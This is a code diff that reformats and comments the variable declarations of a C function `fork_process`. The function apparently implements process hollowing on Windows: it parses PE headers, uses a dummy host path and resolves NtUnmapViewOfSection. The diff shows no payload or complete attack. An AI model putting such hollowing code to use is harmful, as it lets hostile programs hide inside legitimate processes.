@@ -29,42 +29,40 @@ enum _fork_proc_ret_ {
  * @param phProc: Pointer to store the handle of the child process.
 */
 int fork_process(unsigned char *lpImage, char *pCmdLine, char *pDummyPath, STARTUPINFO *pStartInfo, PROCESS_INFORMATION *pProcInfo, int *pPid, HANDLE *phProc) {
-	long int                lWritten;
-	long int                lHeaderSize;
-	long int                lImageSize;
-	long int                lSectionCount;
-	long int                lSectionSize;
-	long int                lFirstSection;
-	long int                lPreviousProtection;
-	long int                lJumpSize;
-	LPVOID                  lpImageMemory;
-	LPVOID                  lpImageMemoryDummy;
-	IMAGE_DOS_HEADER        dsDosHeader;
-	IMAGE_NT_HEADERS        ntNtHeader;
-	IMAGE_SECTION_HEADER    shSections[512 * 2];
-	PROCESS_INFORMATION     piProcessInformation;
-	STARTUPINFO             suStartUpInformation;
-	CONTEXT                 cContext;
-	char *pCmdLineBuf;
-	int                     cmdBufLen;
-
-	// Variables for Local Process
-	FILE *fFile;
-	char *pProcessName;
-	long int                lFileSize;
-	long int                lLocalImageBase;
-	long int                lLocalImageSize;
-	LPVOID                  lpLocalFile;
-	IMAGE_DOS_HEADER        dsLocalDosHeader;
-	IMAGE_NT_HEADERS        ntLocalNtHeader;
+        long int lWritten;                        // Number of bytes written
+	long int lHeaderSize;                     // Size of the header
+	long int lImageSize;                      // Size of the image
+	long int lSectionCount;                   // Number of sections
+	long int lSectionSize;                    // Size of the section
+	long int lFirstSection;                   // First section index
+	long int lPreviousProtection;             // Previous memory protection
+	long int lJumpSize;                       // Size of the jump
+	LPVOID lpImageMemory;                     // Image memory address
+	LPVOID lpImageMemoryDummy;                // Dummy image memory address
+	IMAGE_DOS_HEADER dsDosHeader;             // DOS header structure
+	IMAGE_NT_HEADERS ntNtHeader;              // NT header structure
+	IMAGE_SECTION_HEADER shSections[512 * 2]; // Array of section headers
+	PROCESS_INFORMATION piProcessInformation; // Process information structure
+	STARTUPINFO suStartUpInformation;         // Startup information structure
+	CONTEXT cContext;                         // Context structure
+	char* pCmdLineBuf;                        // Command line argument buffer
+	int cmdBufLen;                            // Length of the command line argument
+	// Variables for Local Proces------
+	FILE* fFile;  		                  // File pointer for the local process
+	char* pProcessName;                       // Name of the local process
+	long int lFileSize;                       // Size of the file
+	long int lLocalImageBase;                 // Local image base address
+	long int lLocalImageSize;                 // Local image size
+	LPVOID lpLocalFile;                       // Local file pointer
+	IMAGE_DOS_HEADER dsLocalDosHeader;        // Local DOS header structure
+	IMAGE_NT_HEADERS ntLocalNtHeader;         // Local NT header structure
 
 	NtUnmapViewOfSectionF NtUnmapViewOfSection = (NtUnmapViewOfSectionF)GetProcAddress(LoadLibrary("ntdll.dll"), "NtUnmapViewOfSection");
 
-	// End Variable Definition
-	pProcessName = (char *)malloc(MAX_PATH);
-	if (pProcessName == NULL) {
-		return FORK_PROC_ERR_MALLOC;
-	}
+	pProcessName = malloc(MAX_PATH);
+	if (pProcessName == NULL) 
+  	   return FORK_PROC_ERR_MALLOC;
+	
 	memset(pProcessName, 0x00, MAX_PATH);
 
 	if (pDummyPath == NULL) {
